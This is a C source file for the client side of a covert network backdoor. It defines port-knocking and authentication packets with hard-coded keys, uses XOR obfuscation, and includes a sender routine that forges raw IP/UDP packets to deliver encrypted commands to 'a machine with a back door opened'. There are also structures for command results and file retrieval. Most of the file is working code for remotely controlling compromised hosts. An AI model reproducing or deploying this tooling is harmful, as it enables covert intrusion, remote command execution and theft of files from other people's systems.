#define KEY1          "One cannot trust anybody these days!"
#define KEY2          "We are going to change the workd!"
#define KEY3          "So, people hire you to break into their places to make sure no one can break into their places?"
#define COMMANDSTART   0xAA55
#define COMMANDEND     0x55AA
#define DATA_LEN       64
#define F_CER          0x55AA     // Flag for command execution results
#define F_AUTH         0xF8F8     // Flag for authentication packets
#define KEY_AUTH       "Q0F8-V$X" // Key for authentication packets
#define F_SEND         0x3989     // Flag for sending file packets
#define G_THREADS_ENABLED         // Enable g-threads system
#define CONFIGFILE     "/etc/bdclient.conf"     // Config file

// Structure definition
struct knocking
{
	unsigned checksum   :16; // For extra checksum
	unsigned port       :16; // The knocking port number
	struct Time              // Knocking info
	{
		unsigned hour   : 5;
		unsigned minute : 6;
		unsigned second : 6;
		unsigned dur    :15;
	} time;
	unsigned sip        :32; // The port will be opened for this IP only
};

struct send_buffer
{
    struct iphdr  IPHeader;         // IP header
    struct udphdr UDPHeader;        // UDP header
    unsigned char data[DATA_LEN];   // UDP data
};

struct pseud_packet_udp                   // Pseudo packet for checksum calculation only
{
	unsigned int    source_address;       // Source IP
	unsigned int    dest_address;         // Destination IP
	unsigned char   placeholder;          // Has to be zero
	unsigned char   protocol;             // Protocol type, has to be UDP
	unsigned short  udp_length;           // UDP packet length
	struct   udphdr udp;                  // UDP header
	unsigned char   data[DATA_LEN];       // UDP data
};

struct pseudo_header_tcp
{
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
    struct tcphdr tcp;
};

struct received_buffer
{
    struct iphdr   IPHeader;
    struct icmphdr ICMPHeader;
    unsigned char  data[56];
};

struct Auth_buffer
{
    struct iphdr  IPHeader;
    struct tcphdr TCPHeader;
};

static unsigned short SOURCE_PORT;   //      0x55AA
static unsigned short DEST_PORT;     //      0x55AA
static unsigned short SPORT_KNOCK;   //      port number used for knocking
static unsigned short DPORT_KNOCK;
static unsigned short P_AUTH;        // Source port for authentication packets
static unsigned short D_AUTH;        // Destination port for authentication packets

// Function prototypes
void on_window_destroy (GtkWidget *widget, gpointer data);
void on_close_button_clicked (GtkWidget *button);
void on_clear_button_clicked(GtkWidget *button);
void on_send_button_clicked(GtkWidget *button);
void on_save_button_clicked(GtkWidget *button);
void on_knock_button_clicked(GtkWidget *button);
void on_download_button_clicked(GtkWidget *button);
void on_about_button_clicked(GtkWidget *button);
void on_auth_button_clicked(GtkWidget *button);
void msgError(char *msg);
void purifyIP(char *buf);
void config(void);

unsigned char isDigit(char *str, int len);

void* RcvCmdRst(void *arg);
void* rcv_file(void *y);


/* clipped from ping.c (this function is the whore of checksum routines */
/* as everyone seems to use it..I feel so dirty...) */

/* Copyright (c)1987 Regents of the University of California.
* All rights reserved.
*
* Redistribution and use in source and binary forms are permitted
* provided that the above copyright notice and this paragraph are
* dupliated in all such forms and that any documentation, advertising 
* materials, and other materials related to such distribution and use
* acknowledge that the software was developed by the University of
* California, Berkeley. The name of the University may not be used
* to endorse or promote products derived from this software without
* specific prior written permission. THIS SOFTWARE IS PROVIDED ``AS
* IS'' AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, 
* WITHOUT LIMITATION, THE IMPLIED WARRANTIES OF MERCHATIBILITY AND 
* FITNESS FOR A PARTICULAR PURPOSE
*/
/****************************************************************************
Function    :  in_chsum
DATE        :  
REVISIONS   :  
PROGRAMMER  :  Unknown
Inteface    :  unsigned short in_cksum(unsigned short *ptr, int nbytes)
               unsigned short *ptr : Data source
               int nbytes          : Size of data source
Description :  This function is used to calculate the checksum of a header or a packet
Returns     :  Checksum value
****************************************************************************/
unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
	register long		sum;		// assumes long == 32 bits
	u_short			oddbyte;
	register u_short	answer;		// assumes u_short == 16 bits

     // Our algorithm is simple, using a 32-bit accumulator (sum),
	 // we add sequential 16-bit words to it, and at the end, fold back
	 // all the carry bits from the top 16 bits into the lower 16 bits.
	 

	sum = 0;
	while (nbytes > 1)  {
		sum += *ptr++;
		nbytes -= 2;
	}

				            // mop up an odd byte, if necessary
	if (nbytes == 1) {
		oddbyte = 0;		// make sure top half is zero
		*((u_char *) &oddbyte) = *(u_char *)ptr;   // one byte only 
		sum += oddbyte;
	}

	// Add back carry outs from top 16 bits to low 16 bits.

	sum  = (sum >> 16) + (sum & 0xffff);	// add high-16 to low-16
	sum += (sum >> 16);			            // add carry
	answer = ~sum;		                    // ones-complement, then truncate to 16 bits
	return(answer);
}

/****************************************************************************
Function    :  host_convert
DATE        :  11-15-96
REVISIONS   :  
PROGRAMMER  :  Craig H. Rowland
Inteface    :  unsigned int host_convert(char *hostname)
               char *hostname : The host name string
Description :  This function is used to convert a host name string to an integer
Returns     :  converted value
****************************************************************************/
unsigned int host_convert(char *hostname)
{
   static struct in_addr i;
   struct hostent *h;
   char error[80];
   
   i.s_addr = inet_addr(hostname);
   if(i.s_addr == -1)
   {
      h = gethostbyname(hostname);
      if(h == NULL)
      {
         bzero(error,80);
         sprintf(error, "cannot resolve %s\n", hostname);
         msgError(error);
         return 0;
      }
      bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
   }
   return i.s_addr;
}

/****************************************************************************
Function    :  encrypt
REVISIONS   :  
PROGRAMMER  :  David Wang
Parameters  :  unsigned char *buffer : Input/Output buffer
               unsigned char *key    : Key buffer
               unsigned char buf_len : Input/Output buffer length
               unsigned char key_len : Key length
Description :  This function is used to encrypt the content of input buffer with
               the key. The encryption algorithm is just XOR the imput string with
               the provided key string.
Returns     :  None
****************************************************************************/
void encrypt(unsigned char *buffer, unsigned char *key, unsigned char buf_len, unsigned char key_len)
{
	unsigned char i,j;
	unsigned char Buf[buf_len];
	unsigned char Key[key_len];
	
	j = 0;
	bzero(Buf,sizeof(Buf));
	bzero(Key,sizeof(Key));
	bcopy(buffer,Buf,buf_len);
	bcopy(key,Key,key_len);
	
	for(i=0;i<buf_len;i++)
	{
		Buf[i] ^= Key[j++];
		if(j == key_len) j = 0;
	}
	
	bcopy(Buf,buffer,buf_len);
}

/****************************************************************************
Function    :  decrypt
REVISIONS   :  
PROGRAMMER  :  David Wang
Parameters  :  unsigned char *buffer : Input/Output buffer
               unsigned char *key    : Key buffer
               unsigned char buf_len : Input/Output buffer length
               unsigned char key_len : Key length
Description :  This function is used to encrypt the content of input buffer with
               the key. The encryption algorithm is just XOR the imput string with
               the provided key string.
Returns     :  None
****************************************************************************/
void decrypt(unsigned char *buffer, unsigned char *key, unsigned char buf_len, unsigned char key_len)
{
	unsigned char i,j;
	unsigned char Buf[buf_len];
	unsigned char Key[key_len];
	
	j = 0;
	bzero(Buf,sizeof(Buf));
	bzero(Key,sizeof(Key));
	bcopy(buffer,Buf,buf_len);
	bcopy(key,Key,key_len);
	
	for(i=0;i<buf_len;i++)
	{
		Buf[i] ^= Key[j++];
		if(j == key_len) j = 0;
	}
	
	bcopy(Buf,buffer,buf_len);
}

/****************************************************************************
Function    :  sender
REVISIONS   :  
PROGRAMMER  :  David Wang
Inteface    :  void sender(char *sip, char *dip, unsigned char* buffer)
               char *sip             : Source ip
               char *dip             : Destination ip
               unsigned char* buffer : Data buffer
Description :  This function is used to send encrypted command to a machine
               with a back door opened.
Returns     :  NONE
****************************************************************************/
void sender(char *sip, char *dip, unsigned char* buffer)
{
    int sd;
    struct send_buffer sb;
    int on = 1;
    struct sockaddr_in sin;
    struct pseud_packet_udp pseudo_packet;
    
    // Open raw socket and set socket option to IP_HDRINCL
    sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
    
    // Forge IP header
    sb.IPHeader.ihl      = 5;
    sb.IPHeader.version  = 4;
    sb.IPHeader.tos      = 0;
    sb.IPHeader.tot_len  = htons(28 + DATA_LEN);
    sb.IPHeader.id       = (int)(255.0*rand()/(RAND_MAX+1.0)); 
    sb.IPHeader.frag_off = 0;
    sb.IPHeader.ttl      = 64;
    sb.IPHeader.protocol = IPPROTO_UDP;
    sb.IPHeader.check    = 0;
    sb.IPHeader.saddr    = host_convert(sip);
    sb.IPHeader.daddr    = host_convert(dip);
    sb.IPHeader.check    = in_cksum((unsigned short *)&sb.IPHeader, 20);

    // Drop our forged data into the socket struct
    sin.sin_family = AF_INET;
    sin.sin_port = sb.UDPHeader.dest;
    sin.sin_addr.s_addr = sb.IPHeader.daddr; 

    // Forge UDP header
	sb.UDPHeader.source = htons(SOURCE_PORT);
	sb.UDPHeader.dest   = htons(DEST_PORT);
	sb.UDPHeader.len    = htons(DATA_LEN + 8);
    sb.UDPHeader.check  = 0;
    bcopy(buffer, &(sb.data), DATA_LEN);
    
    // Forge pseudo packet
    bcopy(&(sb.UDPHeader), &(pseudo_packet.udp), 8);
    bcopy(&(sb.data), &(pseudo_packet.data), DATA_LEN);
    pseudo_packet.source_address = sb.IPHeader.saddr;
    pseudo_packet.dest_address = sb.IPHeader.daddr;
    pseudo_packet.placeholder  = 0;
    pseudo_packet.protocol     = IPPROTO_UDP;
    pseudo_packet.udp_length   = htons(DATA_LEN + 8);
    
    // Calculate UDP checksum
    sb.UDPHeader.check = in_cksum((unsigned short *)&pseudo_packet, sizeof(pseudo_packet));

    // Send the packet
    sendto(sd, &sb, 28 + DATA_LEN, 0, (struct sockaddr *)&sin, sizeof(sin));
}
